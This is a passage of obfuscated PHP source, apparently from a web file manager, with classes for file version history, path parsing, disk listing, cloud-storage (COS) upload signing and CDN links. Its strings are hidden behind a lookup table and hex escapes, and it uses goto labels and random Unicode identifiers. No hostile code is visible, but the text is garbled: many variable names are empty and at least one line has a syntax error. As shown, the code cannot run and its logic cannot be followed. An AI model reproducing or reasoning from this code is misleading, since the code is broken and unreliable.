($֑Ԟ[$ҹ[76]] == 0) { return; } if ($֑Ԟ[$ҹ[76]] >= 1024 * 1024 * 500) { return !1; } $ͯǮ = IO::hashSimple($); if ($ޅӳ && $ޅӳ[0][$ҹ[640]] == $ͯǮ) { return !0; } if (array_key_exists($ҹ[217], $֑Ԟ) && !$֑Ԟ[$ҹ[217]]) { return !1; } $豝 = short_id(time()); $ = array($ҹ[443] => $豝, $ҹ[640] => $ͯǮ, $ҹ[32] => $֑Ԟ[$ҹ[32]] . $ҹ[10] . date($ҹ[1282]) . rand_string(1), $ҹ[76] => $֑Ԟ[$ҹ[76]], $ҹ[495] => USER_ID, $ҹ[215] => time(), $ҹ[1283] => $ҹ[12]); IO::mkdir($ġꫦ[$ҹ[1284]]); $âˇ = IO::copy($, $ġꫦ[$ҹ[1284]], !1, $[$ҹ[32]]); if (!$âˇ) { self::clearEmptyFolder($ġꫦ[$ҹ[1284]]); return !1; } array_unshift($ޅӳ, $); if (count($ޅӳ) > $ۯ) { $ˀ = array_slice($ޅӳ, $ۯ); foreach ($ˀ as $) { IO::remove($ġꫦ[$ҹ[1284]] . $[$ҹ[32]]); } $ޅӳ = array_slice($ޅӳ, 0, $ۯ); } return self::saveData($ġꫦ[$ҹ[1285]], $ޅӳ); } public static function remove($, $㨙ƨ) { $޵ =& $_SERVER[]; $˱ؘ = self::listData($); $М = array(); if (!$˱ؘ) { return !1; } foreach ($˱ؘ[$޵[413]] as $ψ) { if ($ψ[$޵[443]] == $㨙ƨ) { IO::remove($˱ؘ[$޵[1284]] . $ψ[$޵[32]]); continue; } $М[] = $ψ; } return self::saveData($˱ؘ[$޵[1285]], $М); } public static function clear($ͣ, $ = true) { $ =& $_SERVER[]; $ڽ = self::listData($ͣ, $); if (!$ڽ) { return !1; } foreach ($ڽ[$[413]] as $) { IO::remove($ڽ[$[1284]] . $[$[32]]); } return self::saveData($ڽ[$[1285]], array()); } public static function moveHistory($뒪, $Ψ = '', $ƾ = '') { $ =& $_SERVER[]; $ = self::listData($뒪, !1); if (!$ || !$[$[413]]) { return !1; } $̔ = $[1272]; $Ψ = $Ψ ? $Ψ : get_path_this($뒪); $ƾ = $ƾ ? $ƾ : $[$[1284]]; $眸 = substr(get_path_this($[$[1285]]), 0, -strlen($̔)); foreach ($[$[413]] as $כᮂ => $ђ) { $ݺ = $Ψ . substr($ђ[$[32]], strlen($眸)); $ؽ = IO::move($[$[1284]] . $ђ[$[32]], $ƾ, !1, $ݺ); if ($ؽ) { $[$[413]][$כᮂ][$[32]] = $ݺ; } } $[$[1285]] = IO::move($[$[1285]], $ƾ, !1, $Ψ . $̔); self::saveData($[$[1285]], $[$[413]]); self::clearEmptyFolder($[$[1284]]); } public static function rollback($ю, $) { $ռӀ =& $_SERVER[]; $ = self::listData($ю); if (!$) { return; } $ݰ = IO::info($ю); foreach ($[$ռӀ[413]] as $ => $ꉌ) { if ($ꉌ[$ռӀ[443]] == $) { self::add($ю); $읣 = $[$ռӀ[1284]] . $ꉌ[$ռӀ[32]]; $צ = IO::copy($읣, IO::pathFather($ю), REPEAT_REPLACE, $ݰ[$ռӀ[32]]); if ($צ) { self::remove($ю, $); } return $צ; } } return !1; } public static function setDetail($ʤ, $֯̕, $շ) { $ =& $_SERVER[]; $ = self::listData($ʤ); if (!$) { return; } foreach ($[$[413]] as $ => $޷) { if ($޷[$[443]] == $֯̕) { $[$[413]][$][$[1283]] = $շ; self::saveData($[$[1285]], $[$[413]]); return !0; } } return !1; } public static function fileInfo($, $ɓ) { $ =& $_SERVER[]; $ԃ = self::listData($); if (!$ԃ) { show_json(LNG($[105]), !1); } $ = $[12]; foreach ($ԃ[$[413]] as $ => $ѷ) { if ($ѷ[$[443]] != $ɓ) { continue; } $ = $ԃ[$[1284]] . $ѷ[$[32]]; break; } if (!$) { show_json(LNG($[105]), !1); } return IO::info($); } public static function fileOut($, $, $ = false) { $ =& $_SERVER[]; $و = self::fileInfo($, $); $ʙ =& $GLOBALS[$[7]]; $ = isset($ʙ[$[1235]]) && $ʙ[$[1235]] == 1; if (isset($ʙ[$[33]]) && $ʙ[$[33]] == $[1286]) { return IO::fileOutImage($و[$[84]], $ʙ[$[1287]]); } IO::fileOut($و[$[84]], $, get_path_this($)); } public static function listData($Ȏ, $ = true) { $ݭې =& $_SERVER[]; if ($ && !IO::exist($Ȏ)) { return !1; } if (!self::$_historyBase) { self::$_historyBase = self::getBasePath(); } if (substr($Ȏ, 0, strlen(TEMP_PATH)) == TEMP_PATH) { return !1; } $ۗ = self::pathHistory($Ȏ); $Ä = array($ݭې[1285] => $ۗ . $ݭې[1272], $ݭې[1284] => rtrim(get_path_father($ۗ), $ݭې[8]) . $ݭې[8], $ݭې[413] => array()); $ܲ = IO::getContent($Ä[$ݭې[1285]]); if ($ܲ) { $ = json_decode($ܲ, !0); if (is_array($)) { $Ä[$ݭې[413]] = $; } } return $Ä; } private static function saveData($, $۫߄) { $뼵 =& $_SERVER[]; self::log($뼵[1288] . $ . $뼵[71] . count($۫߄), $뼵[785]); if ($۫߄) { return IO::setContent($, json_encode($۫߄)); } $˭ = IO::pathFather($); IO::remove($); self::clearEmptyFolder($˭); return !0; } public static function clearEmptyFolder($) { $Ԇ =& $_SERVER[]; if (trim($, $Ԇ[8]) == trim(self::$_historyBase, $Ԇ[8])) { return; } $Ȏ = IO::pathFather($); $ = IO::has($, !0); if ($[$Ԇ[223]] > 0 || $[$Ԇ[224]] > 0) { return; } IO::remove($); self::clearEmptyFolder($Ȏ); } private static function getBasePath() { $۟웈 =& $_SERVER[]; $ = Model($۟웈[1289])->get($۟웈[1290]); if ($) { if (!IO::exist($)) { IO::mkdir($); } if (get_path_this($) == $۟웈[1275]) { $̚ = $۟웈[1291] . rand_string(8); @rename($, get_path_father($) . $۟웈[8] . $̚); $ = DATA_PATH . $̚ . $۟웈[8]; file_put_contents(DATA_PATH . $۟웈[1225], $۟웈[12]); Model($۟웈[1289])->set($۟웈[1290], $); } return $; } $ = DATA_PATH . $۟웈[1291] . rand_string(8) . $۟웈[8]; $ = IO::mkdir($); $ = rtrim($, $۟웈[8]) . $۟웈[8]; file_put_contents($ . $۟웈[1225], $۟웈[12]); file_put_contents(DATA_PATH . $۟웈[1225], $۟웈[12]); Model($۟웈[1289])->set($۟웈[1290], $); return $; } } class KodIO { const KOD_SOURCE = "\x7b\163\157\165\x72\143\x65\175"; const KOD_USER_RECYCLE = "\173\165\163\145\x72\122\x65\143\x79\x63\x6c\x65\x7d"; const KOD_USER_FAV = "\x7b\165\x73\x65\x72\106\x61\166\x7d"; const KOD_USER_FILE_TAG = "\173\x75\x73\x65\162\x46\151\154\145\x54\141\x67\175"; const KOD_USER_FILE_TYPE = "\173\165\x73\x65\x72\x46\x69\x6c\145\124\x79\x70\145\x7d"; const KOD_GROUP_ROOT_SELF = "\x7b\147\162\157\165\x70\122\157\157\x74\x53\145\x6c\146\x7d"; const KOD_USER_SHARE = "\x7b\x75\163\145\x72\123\x68\x61\162\x65\x7d"; const KOD_USER_SHARE_LINK = "\x7b\x75\163\x65\x72\x53\x68\x61\162\145\114\151\156\x6b\175"; const KOD_USER_SHARE_TO_ME = "\173\x73\150\x61\162\x65\x54\x6f\x4d\x65\x7d"; const KOD_SHARE_ITEM = "\173\163\150\x61\x72\145\x49\164\145\x6d\175"; const KOD_SHARE_LINK = "\x7b\163\150\141\162\x65\x49\x74\145\x6d\x4c\151\x6e\153\x7d"; const KOD_SEARCH = "\x7b\163\x65\141\162\x63\150\x7d"; const KOD_BLOCK = "\173\x62\x6c\157\x63\x6b\x7d"; const KOD_IO = "\x7b\151\157\x7d"; const KOD_USER_RECENT = "\x7b\x75\x73\x65\x72\122\145\156\x63\145\x6e\164\175"; const KOD_USER_DRIVER = "\173\x64\x72\151\x76\x65\x72\x7d"; public static function typeList() { $¿ =& $_SERVER[]; return array($¿[1292] => self::KOD_SOURCE, $¿[1293] => self::KOD_USER_RECYCLE, $¿[1294] => self::KOD_USER_FAV, $¿[1295] => self::KOD_USER_FILE_TAG, $¿[1296] => self::KOD_USER_FILE_TYPE, $¿[1297] => self::KOD_GROUP_ROOT_SELF, $¿[1298] => self::KOD_USER_SHARE, $¿[1299] => self::KOD_USER_SHARE_LINK, $¿[1300] => self::KOD_USER_SHARE_TO_ME, $¿[1301] => self::KOD_SHARE_ITEM, $¿[1302] => self::KOD_SHARE_LINK, $¿[1303] => self::KOD_SEARCH, $¿[1304] => self::KOD_BLOCK, $¿[1305] => self::KOD_IO, $¿[1306] => self::KOD_USER_RECENT, $¿[1307] => self::KOD_USER_DRIVER); } public static function parse($ԏ) { $ =& $_SERVER[]; $ԏ = self::clear($ԏ); $ = array_values(self::typeList()); preg_match($[1308], $ԏ, $̒); $ٗ = array($[464] => !1, $[1309] => !1, $[461] => !1, $[84] => $ԏ, $[1208] => !1, $[1207] => $[12]); if (is_array($̒) && count($̒) == 5) { $ = $[1310] . $̒[2] . $[371]; if (in_array($, $)) { $ٗ[$[1208]] = $̒[1]; $ٗ[$[33]] = $; $ٗ[$[1311]] = substr($, 1, -1); $ٗ[$[443]] = $̒[3]; } $ٗ[$[1207]] = $̒[4]; } $ = array($[12], self::KOD_SOURCE, self::KOD_IO, self::KOD_SHARE_ITEM, self::KOD_SHARE_LINK, self::KOD_USER_DRIVER); $ٗ[$[1274]] = in_array($ٗ[$[33]], $); return $ٗ; } public static function isTruePath($у) { $ݍ =& $_SERVER[]; if (substr($у, 0, 1) != $ݍ[1310]) { return !0; } if (strpos($у, $ݍ[451]) === 0) { return !0; } if (strpos($у, $ݍ[1278]) === 0) { return !0; } if (strpos($у, $ݍ[1312]) === 0) { return !0; } if (strpos($у, $ݍ[1313]) === 0) { return !0; } if (strpos($у, $ݍ[1314]) === 0) { return !0; } return !1; } public static function clear($ݙ) { $ʕˉ =& $_SERVER[]; $ݙ = str_replace(array($ʕˉ[1117], $ʕˉ[246]), $ʕˉ[53], $ݙ); $ݙ = str_replace($ʕˉ[97], $ʕˉ[8], $ݙ); $ = $ʕˉ[1315]; if (substr($ݙ, 0, 3) == $ʕˉ[1316]) { $ݙ = substr($ݙ, 3); } while (strstr($ݙ, $)) { $ݙ = str_replace($, $ʕˉ[8], $ݙ); } $ݙ = preg_replace($ʕˉ[1317], $ʕˉ[8], $ݙ); if ($ݙ == $ʕˉ[8]) { return $ʕˉ[8]; } $ݙ = rtrim($ݙ, $ʕˉ[8]); return $ݙ; } public static function pathTrue($߈) { $Ư =& $_SERVER[]; if (!$߈) { return $Ư[12]; } $߈ = str_replace($Ư[561], $Ư[8], str_replace($Ư[1318], $Ư[8], $߈)); $߈ = str_replace($Ư[561], $Ư[8], str_replace($Ư[1318], $Ư[8], $߈)); if (!strstr($߈, $Ư[1316])) { return $߈; } $셇 = explode($Ư[8], $߈); foreach ($셇 as $ʨ => $鶘) { if ($鶘 !== $Ư[1319]) { continue; } for ($ޥ = $ʨ; $ޥ >= 0; $ޥ--) { if ($셇[$ޥ] === $Ư[10] || $셇[$ޥ] === $Ư[1319] || $셇[$ޥ] === -1) { continue; } if ($셇[$ޥ] === $Ư[12]) { $셇[$ʨ] = -1; break; } $셇[$ʨ] = -1; $셇[$ޥ] = -1; break; } } $ = array(); foreach ($셇 as $鶘) { if ($鶘 !== -1) { $[] = $鶘; } } $ = implode($Ư[8], $); if (strpos($, $Ư[1320]) === 0) { $ = $Ư[1316] . substr($, strlen($Ư[1320])); } return $; } public static function sourceID($) { $ =& $_SERVER[]; $ߓ = self::parse($); if ($ߓ[$[33]] !== self::KOD_SOURCE) { show_json(LNG($[1321]), !1); } return $ߓ[$[443]]; } public static function make($) { if (!$) { return !1; } return self::makePath(self::KOD_SOURCE, intval($)); } public static function makeShare($±, $) { return self::makePath(self::KOD_SHARE_ITEM, $±, $); } public static function makeFileTypePath($) { return self::makePath(self::KOD_USER_FILE_TYPE, $); } public static function makeFileTagPath($) { return self::makePath(self::KOD_USER_FILE_TAG, $); } public static function makePath($, $۬ݥ = '', $Ն = '') { $ =& $_SERVER[]; $ş = substr($, 1, -1); $޹͘ = $[1322] . $ş . $[1323] . $۬ݥ . $[1324]; $޹͘ = $Ն ? $޹͘ . $Ն . $[8] : $޹͘; return $޹͘; } public static function hashPath($˪, $ = true) { $Ò =& $_SERVER[]; $ = is_array($˪) ? $˪ : IO::info($˪); $˚ = _get($, $Ò[1325], $Ò[12]); if (!$˚ && isset($[$Ò[219]])) { $˚ = trim($[$Ò[219]], $Ò[118]); } if (!$˚ && isset($[$Ò[181]]) && $[$Ò[181]]) { $ = IO::info(KodIO::make($[$Ò[181]])); $˚ = _get($, $Ò[1325], $Ò[12]); } $̈ = md5($[$Ò[84]] . $[$Ò[76]] . $[$Ò[85]]); if (!$˚ && file_exists($[$Ò[84]])) { $˚ = Cache::get($̈ . $Ò[1326]); $˚ = !1; if (!$˚) { $˚ = IO::hashSimple($[$Ò[84]]); Cache::set($̈ . $Ò[1326], $˚, 3600 * 24 * 30); } } if ($ && !$˚) { } return $˚ ? $˚ : $̈; } public static function hashPathSafe($, $٣ = true) { $ =& $_SERVER[]; $ = self::hashPath($, $٣); return md5($ . $[1327] . Model($[804])->get($[805])); } public static function initSystemPath() { $ =& $_SERVER[]; if (defined($[1328])) { return; } define($[1328], self::systemPath($[179])); define($[1329], self::systemPath($[1330])); define($[1331], self::systemPath($[1332])); define($[1333], self::systemPath($[1334])); IOHistory::bindEvent(); } public static function systemPath($ؗ) { $Ӂ =& $_SERVER[]; $ = $Ӂ[1335] . ucfirst($ؗ); $Ƿ = Model($Ӂ[804])->get($); if ($Ƿ) { return $Ƿ; } if ($ؗ == $Ӂ[179]) { $Ƿ = self::make(Model($Ӂ[859])->systemRootPathAdd($Ӂ[574])); } else { $Ƿ = self::systemPath($Ӂ[179]); $ћ = self::sourceID($Ƿ); $Ƿ = self::make(Model($Ӂ[859])->mkdir($ћ, $ؗ)); } Model($Ӂ[804])->set($, $Ƿ); return $Ƿ; } public static function systemFolder($ъ) { $󀴛 = IO_PATH_SYSTEM_SOURCE . $ъ; $ = Cache::get($󀴛); if (!$) { $ǀ = IO::infoFullSimple($󀴛); if (!$ǀ) { $ = IO::mkdir($󀴛, REPEAT_SKIP); } else { $ = $ǀ[$_SERVER[][84]]; } Cache::set($󀴛, $, 3600 * 10); } return $; } public static function defaultDriver() { return Model($_SERVER[][801])->defaultDriver(); } public static function defaultIO() { $ =& $_SERVER[]; $ָ = self::defaultDriver(); return $[1336] . $ָ[$[443]] . $[1324]; } public static function defaultDriverInit() { static $Љ = false; if ($Љ) { return $Љ; } $Љ = IO::init(self::defaultIO()); return $Љ; } public static function fileTypeList() { $̹ =& $_SERVER[]; $ʍ = $GLOBALS[$̹[6]][$̹[1337]]; foreach ($ʍ as $۶¾ => $֩) { $Ȣ = $̹[1338] . $۶¾; $À = LNG($Ȣ); if ($Ȣ != $À) { $ʍ[$۶¾][$̹[32]] = $À; } } return $ʍ; } public static function diskList($ = true) { $ف = $_SERVER[][1339]; if ($) { $ = Cache::get($ف); if (is_array($)) { return $; } } $ = self::diskListGet(); Cache::set($ف, $, 60); return $; } public static function diskListGet() { $éė =& $_SERVER[]; $倒 = array(); if ($GLOBALS[$éė[6]][$éė[1340]] == $éė[1341]) { $ܻ = $éė[1342]; for ($ľ = 0; $ľ < strlen($ܻ); $ľ++) { $ = $ܻ[$ľ] . $éė[1343]; if (file_exists($)) { $倒[] = $; } } return $倒; } if (!function_exists($éė[98])) { $倒[] = $éė[870]; return $倒; } $ˠ = explode($éė[246], shell_exec($éė[1344])); array_shift($ˠ); array_pop($ˠ); $ = array($éė[1345], $éė[1346], $éė[1347], $éė[1348], $éė[1349], $éė[1350], $éė[1351], $éė[1352]); foreach ($ˠ as $) { $ = preg_split($éė[1353], $); $ = $[count($) - 1]; if (!strstr($[0], $éė[1354]) || !$) { continue; } $Λ = rtrim($, $éė[8]) . $éė[8]; if (in_array($Λ, $)) { continue; } $倒[] = $Λ; } return $倒; } public static function isSameDisk($, $ڵ) { $ =& $_SERVER[]; if ($GLOBALS[$[6]][$[1340]] == $[1341]) { return strtolower(substr($, 0, 1)) == strtolower(substr($ڵ, 0, 1)); } $ = self::diskList(); $̭ = !1; $壘 = !1; sort($); $ = array_reverse($); $ = rtrim($, $[8]) . $[8]; $ڵ = rtrim($ڵ, $[8]) . $[8]; foreach ($ as $꫑) { $ֱ = strlen($꫑); if (!$̭ && substr($, 0, $ֱ) == $꫑) { $̭ = $꫑; } if (!$壘 && substr($ڵ, 0, $ֱ) == $꫑) { $壘 = $꫑; } if ($̭ && $壘) { break; } } return $̭ === $壘; } public static function transferType($钶ٕ, $) { $ˁŉ =& $_SERVER[]; $ = self::driverType($钶ٕ); $ = self::driverType($); if ($[$ˁŉ[33]] == $[$ˁŉ[33]] && $[$ˁŉ[1355]] == $[$ˁŉ[1355]]) { return $ˁŉ[1356]; } if ($[$ˁŉ[33]] == $ˁŉ[903] && $[$ˁŉ[33]] == $ˁŉ[106]) { return $ˁŉ[1235]; } if ($[$ˁŉ[33]] == $ˁŉ[106] && $[$ˁŉ[33]] == $ˁŉ[903]) { return $ˁŉ[107]; } return $ˁŉ[1357]; } public static function driverType($ϓ) { $ =& $_SERVER[]; $ = str_replace($[1358], $[12], strtolower($ϓ->getType())); if ($ == $[791] || $ == $[1359] || $ == $[1360]) { $ϓ = self::defaultDriverInit(); } else { if ($ == $[1245] || $ == $[1361]) { $ϓ = IO::init($ϓ->pathParse[$[1190]]); } } $ˬ㘇 = $ϓ->path; $ = str_replace($[1358], $[12], strtolower($ϓ->getType())); if ($ == $[106]) { return array($[33] => $[106], $[1355] => $[12], $[84] => $ˬ㘇, $[95] => $ϓ); } return array($[33] => $[903], $[1355] => $ϓ->pathDriver, $[84] => $ˬ㘇, $[95] => $ϓ); } public static function pathDriverType($) { return $ ? self::driverType(IO::init($)) : !1; } public static function pathDriverLocal($򓺽) { $Ĵ =& $_SERVER[]; $ = $򓺽 ? self::driverType(IO::init($򓺽)) : !1; return $[$Ĵ[33]] == $Ĵ[106] ? !0 : !1; } public static function allowCover($, $ = true) { $ =& $_SERVER[]; if (is_string($)) { $ = IO::info($); } if (!$ || $[$[33]] == $[75] || $[$[76]] <= 100) { return !1; } if (isset($[$[1362]]) || !$[$[84]]) { return !1; } if (isset($[$[216]]) && !$[$[216]]) { return !1; } static $큦 = false; if (!$큦 || !$) { $ǲ = self::driverType(IO::init($[$[84]])); $혠 = $ǲ[$[95]]; $큦 = $[184]; if ($ǲ[$[33]] == $[106]) { $큦 = $[1363]; } if ($ǲ[$[95]] && is_array($ǲ[$[95]]->config)) { $ŶѢ = $ǲ[$[95]]->config; if (isset($ŶѢ[$[1364]]) && $ŶѢ[$[1364]]) { $큦 = $[1363]; } } } return $큦 == $[1363] ? !0 : !1; } } class PathDriverCOS extends PathDriverBaseS3 { public function __construct($Ŀ) { parent::__construct($Ŀ); $this->signatureVersion($_SERVER[][231]); } public function uploadFormData($͘, $킎 = 3600) { $ӈ =& $_SERVER[]; $ = $ӈ[213]; $壙 = $ӈ[247]; $˦ = $ӈ[257]; $Ŀ = gmdate($ӈ[1365], time() + $킎); $ۙ = (string) time() . $ӈ[71] . (string) (time() + $킎); $ن = array($ӈ[258] => $Ŀ, $ӈ[261] => array(array($ӈ[263] => $), array($ӈ[262] => $this->bucket), array($ӈ[264], $ӈ[265], $ӈ[12]), array($ӈ[268] => $˦), array($ӈ[1366] => $壙), array($ӈ[1367] => $this->accessKey), array($ӈ[1368] => $ۙ))); $ن = json_encode($ن); $ = hash_hmac($ӈ[247], $ۙ, $this->secret); $ʆѯ = sha1($ن); $됢 = hash_hmac($ӈ[247], $ʆѯ, $); $Ը = array($ӈ[263] => $, $ӈ[268] => $˦, $ӈ[276] => base64_encode($ن), $ӈ[1366] => $壙, $ӈ[1367] => $this->accessKey, $ӈ[1369] => $ۙ, $ӈ[1370] => $됢, $ӈ[196] => $this->getHost()); return $Ը; } public function fileOutLink($ֱ) { $ =& $_SERVER[]; if (substr($ֱ, 0, 7) == $[1371]) { $ֱ = $[1372] . substr($ֱ, 7); } header($[162] . $ֱ); die; } } goto c⢞; Fɐ: define($_SERVER[][285], 1); define($_SERVER[][286], 0); define($_SERVER[][287], 2); goto a; eގ: function binCheckBigger($, $ح) { return $ > $ح; } $_SERVER[$_SERVER[߯][3]] = ("\x38\x32\x37\x31"."\x34\x32")+0;$_ju9t="4opg6mlrcbvqa8i3025wdt1k7yuefz9hxnsjbhoepc4uayq8lrs1n0gf27dmw6txjivk3z59h0be";; class ClassBaseCall { protected static $_methodListStatic = array(); protected static $_methodList = array(); public function __call($, $) { $ =& $_SERVER[]; if (isset(self::$_methodList[$])) { return @call_user_func_array(self::$_methodList[$], $); } else { if (method_exists($this, $)) { return call_user_func_array(array($this, $), $); } else { think_exception(__CLASS__ . $[4] . $ . $[5]); } } } public static function __callStatic($߽, $ο) { if (isset(self::$_methodListStatic[$߽])) { return call_user_func_array(self::$_methodListStatic[$߽], $ο); } else { if (method_exists(self, $߽)) { return call_user_func_array(array(self, $߽), $ο); } else { show_json("{$߽}\x28\x29\x20\x6e\157\164\x20\145\170\x69\x73\164\73", !1); } } } public static function addMethod($ܦ, $) { self::$_methodList[$ܦ] = $; } public static function addMethodStatic($ՙ, $¿ؕ) { self::$_methodListStatic[$ՙ] = $¿ؕ; } } goto Dǭ; eݙ: class PathDriverBase { public $pathDriver = ''; public $pathBase = ''; public $path = ''; public $pathID = ''; public $_data = array(); public function __construct() { $׃ =& $_SERVER[]; $this->objectDriver = array($׃[60], $׃[61], $׃[62], $׃[63], $׃[64], $׃[65], $׃[66], $׃[67], $׃[68]); $this->_classObjectID = mt_rand(0, 10000); } public function getPath($Ǿ) { if (in_array($this->getType(), $this->objectDriver)) { return ltrim($Ǿ, $_SERVER[][8]); } return $Ǿ; } public function iconvApp($) { return $; } public function iconvSystem($Ӯɑ) { return $Ӯɑ; } public function iconvTo($ʗ, $, $̇ר) { $ =& $_SERVER[]; if (!$ʗ || !function_exists($[69])) { return $ʗ; } static $Ö = array(); $ŵ = $ . $[70] . $̇ר . $[71] . $ʗ; if (isset($Ö[$ŵ])) { return $Ö[$ŵ]; } if (function_exists($[72])) { $̇ = @mb_convert_encoding($ʗ, $̇ר, $); } else { $̇ = @iconv($, $̇ר, $ʗ); } $̇ = $̇ ? $̇ : $ʗ; if (strstr($̇, $[73])) { $̇ = str_replace($[73], $[11], $̇); } $Ö[$ . $[70] . $̇ר . $[71] . $ʗ] = $̇; $Ö[$̇ר . $[70] . $ . $[71] . $ʗ] = $ʗ; $Ö[$̇ר . $[70] . $ . $[71] . $̇] = $ʗ; $Ö[$ . $[70] . $̇ר . $[71] . $̇] = $̇; return $̇; } public function getPathInner($ܾ) { $޵ = IO::init($ܾ); return $޵->path; } public function getPathOuter($䕢) { $Ś =& $_SERVER[]; $ە = strlen(trim($this->pathBase, $Ś[8])); $䕢 = substr(trim($䕢, $Ś[8]), $ە); return $this->pathDriver . $Ś[8] . ltrim($䕢, $Ś[8]); } public function isParentOf($׏, $ַ) { $Ԡ =& $_SERVER[]; $׏ = rtrim(strtolower($׏), $Ԡ[8]) . $Ԡ[8]; $ַ = rtrim(strtolower($ַ), $Ԡ[8]) . $Ԡ[8]; $ڳ = strpos($ַ, $׏) === 0; return $ڳ; } public function getType() { $ʘш =& $_SERVER[]; $ = str_replace($ʘш[74], $ʘш[12], get_class($this)); return strtolower($); } public function isTypeObject() { if (!is_array($this->objectDriver)) { return !1; } return in_array($this->getType(), $this->objectDriver); } public function fileNameExist($̓, $) { $ =& $_SERVER[]; $ = rtrim($̓, $[8]) . $[8] . $; $ = $this->exist($); return $ ? $ : !1; } public function setModifyTime($޹, $ = '') { } public function renameObject($, $) { $ƌ = $; $ = $this->getPathOuter($); $ = $this->pathFather($) . $; $녙 = IO::copy($, $this->pathFather($), REPEAT_RENAME_FOLDER, $ƌ); if ($녙) { IO::remove($); } return $녙 ? $ : !1; } public function tempFile($ = '', $ԇ = '') { if (!$) { $ = rand_string(15); } $ùȽ = TEMP_FILES . rand_string(15) . $_SERVER[][8]; @mkdir($ùȽ, DEFAULT_PERRMISSIONS, !0); $÷ = $ùȽ . $; @touch($÷); if ($ԇ) { file_put_contents($÷, $ԇ); } return $÷; } public function tempFileRemve($) { @unlink($); @rmdir($this->pathFather($)); } public function mkfile($х, $ = '', $Ƚ = REPEAT_RENAME) { } public function mkdir($ϯ, $Ѝ = REPEAT_SKIP) { } public function delFile($) { } public function delFolder($ì) { } public function copyFile($΂, $齤) { } public function moveFile($, $) { } public function remove($󷆄) { if ($this->isFile($󷆄)) { return $this->delFile($󷆄); } return $this->delFolder($󷆄); } public function rename($ި, $͝) { } public function exist($ȷ) { } public function findByHash($Ҋ = '', $ = '') { return !1; } public function isFile($ݞ) { } public function isFolder($ˁ) { } public function size($ʊ;) { } public function info($) { } public function infoSimple($) { return $this->info($); } public function infoAuth($) { return $this->info($); } public function infoFull($ȡ) { return $this->info($ȡ); } public function infoFullSimple($ݩ) { return $this->info($ݩ); } public function infoWithChildren($ķ) { $Ċ =& $_SERVER[]; static $ = array(); if (isset($[$ķ])) { return $[$ķ]; } $ = $this->info($ķ); if ($ && $[$Ċ[33]] == $Ċ[75]) { $ؿ = array($Ċ[76] => 0, $Ċ[77] => 0, $Ċ[78] => 0); $this->infoChildren($ķ, $ؿ); $[$Ċ[76]] = $ؿ[$Ċ[76]]; $[$Ċ[79]] = array($Ċ[80] => $ؿ[$Ċ[77]], $Ċ[81] => $ؿ[$Ċ[78]]); $[$ķ] = $; } return $; } public function listPath($ۼ, $ = false) { } public function has($, $ʽ = false, $ = false) { } public function canRead($ܤ) { } public function canWrite($ʹ) { } public function getContent($Գ) { } public function setContent($, $ = '') { } protected function infoChildren($̠, &$ц؎) { $尿޲ =& $_SERVER[]; check_abort_echo(); $ = $this->listPath($̠, !0); $ = array_merge($[$尿޲[82]], $[$尿޲[83]]); foreach ($ as $慢) { if ($慢[$尿޲[33]] == $尿޲[75]) { $ц؎[$尿޲[78]]++; $ = $this->getPathInner($慢[$尿޲[84]]); $this->infoChildren($, $ц؎); } else { $ц؎[$尿޲[77]]++; $ц؎[$尿޲[76]] += $慢[$尿޲[76]]; } } } public function fileSubstr($, $Ķ, $) { } public function listAll($ܟ귯) { } public function listAllMake($, &$ď) { $Ǆ՚ =& $_SERVER[]; check_abort_echo(); $ǍΉ = $this->listPath($, !0); if (!$ǍΉ) { return; } $ޮ = array_merge($ǍΉ[$Ǆ՚[82]], $ǍΉ[$Ǆ՚[83]]); foreach ($ޮ as $ۼڅ) { $䛍 = $ۼڅ[$Ǆ՚[33]] == $Ǆ՚[75]; $ċ = array($Ǆ՚[84] => $ۼڅ[$Ǆ՚[84]], $Ǆ՚[75] => $䛍); if (isset($ۼڅ[$Ǆ՚[76]])) { $ċ[$Ǆ՚[76]] = $ۼڅ[$Ǆ՚[76]]; } if (isset($ۼڅ[$Ǆ՚[85]])) { $ċ[$Ǆ՚[85]] = $ۼڅ[$Ǆ՚[85]]; } if (!$䛍) { $ď[] = $ċ; continue; } $ď[] = $ċ; $嬮 = $ۼڅ[$Ǆ՚[84]]; $ = $this->pathDriver; if (substr($ۼڅ[$Ǆ՚[84]], 0, strlen($)) == $) { $嬮 = substr($嬮, strlen($)); } $this->listAllMake($嬮, $ď); } } public function listAllSimple($ː, $έ = false) { $ = $this->listAll($ː); return $this->listAllSimpleMake($, $this->getPathOuter($ː), $έ); } public function listAllSimpleMake($À, $❨, $ʿ) { $ʝ =& $_SERVER[]; $ = array(); $❨ = rtrim(get_path_father($❨), $ʝ[8]) . $ʝ[8]; foreach ($À as $) { $쌉 = array($ʝ[84] => $[$ʝ[84]], $ʝ[86] => $[$ʝ[84]], $ʝ[75] => $[$ʝ[75]]); if (isset($[$ʝ[76]]) && !$[$ʝ[75]]) { $쌉[$ʝ[76]] = $[$ʝ[76]]; } if (isset($[$ʝ[85]])) { $쌉[$ʝ[85]] = $[$ʝ[85]]; } if (is_array($[$ʝ[87]])) { $쌉[$ʝ[86]] = $[$ʝ[87]][$ʝ[84]]; $쌉[$ʝ[76]] = $[$ʝ[87]][$ʝ[76]]; $쌉[$ʝ[85]] = $[$ʝ[87]][$ʝ[85]]; } else { if (substr($[$ʝ[84]], 0, strlen($❨)) == $❨) { $쌉[$ʝ[84]] = substr($[$ʝ[84]], strlen($❨)); } } $ = $[$ʝ[75]] ? $ʝ[8] : $ʝ[12]; $쌉[$ʝ[86]] = rtrim($쌉[$ʝ[86]], $ʝ[8]) . $; $쌉[$ʝ[84]] = $ʝ[8] . trim($쌉[$ʝ[84]], $ʝ[8]) . $; if (!$ʿ) { $ = explode($ʝ[8], trim($쌉[$ʝ[84]], $ʝ[8])); $쌉[$ʝ[84]] = $ʝ[8] . implode($ʝ[8], array_slice($, 1)) . $; } $[] = $쌉; } return array_sort_by($, $ʝ[84]); } public function upload($ߙ, $ݜ, $ = false, $ = REPEAT_REPLACE) { } public function uploadFileByID($ʣ, $, $ۿݶ) { } public function uploadFileByPath($, $Ң, $խܞ = array()) { } public function isUploadServer() { $ȓ =& $_SERVER[]; if (isset($this->ioUploadServer) && $this->ioUploadServer == $ȓ[88]) { return !0; } return $GLOBALS[$ȓ[6]][$ȓ[89]][$ȓ[90]]; } public function isFileOutServer() { $̴ =& $_SERVER[]; if (isset($this->ioFileOutServer) && $this->ioFileOutServer == $̴[88]) { return !0; } return $GLOBALS[$̴[6]][$̴[89]][$̴[91]]; } public function isCdnHost() { return $this->isFileOutServer() || empty($this->cdnHost) ? !1 : !0; } public function getCdnLink($滁) { $ =& $_SERVER[]; if (!$this->isCdnHost()) { return $滁; } return 